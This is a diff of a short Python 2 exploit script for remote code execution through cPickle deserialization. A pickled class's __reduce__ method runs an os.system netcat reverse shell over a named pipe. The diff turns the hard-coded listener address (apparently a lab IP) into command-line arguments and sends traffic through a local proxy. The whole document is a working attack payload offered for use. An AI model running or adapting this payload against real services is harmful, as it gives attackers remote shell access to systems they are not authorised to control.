@@ -1,14 +1,23 @@
 #cPickle deserialization rce
 import cPickle
+import sys 
 from hashlib import md5
 import os 
 import requests
 import urllib
 
+if len(sys.argv) < 3:
+	print("(+) usage %s : lhost lport" % sys.argv[0])
+	sys.exit(-1)
+
+lhost=sys.argv[1]
+lport=sys.argv[2]
+
+
 proxies =  { 'http':'http://127.0.0.1:8080'}
 class shell(object):
 	def __reduce__(self):
-        	return (os.system,("rm -f /var/tmp/backpipe; mknod /var/tmp/backpipe p; nc 10.10.14.20 53 0</var/tmp/backpipe | /bin/bash 1>/var/tmp/backpipe",))
+        	return (os.system,("rm -f /var/tmp/backpipe; mknod /var/tmp/backpipe p; nc "+lhost+" "+lport+" 0</var/tmp/backpipe | /bin/bash 1>/var/tmp/backpipe",))
 
 
 quote = cPickle.dumps(shell())
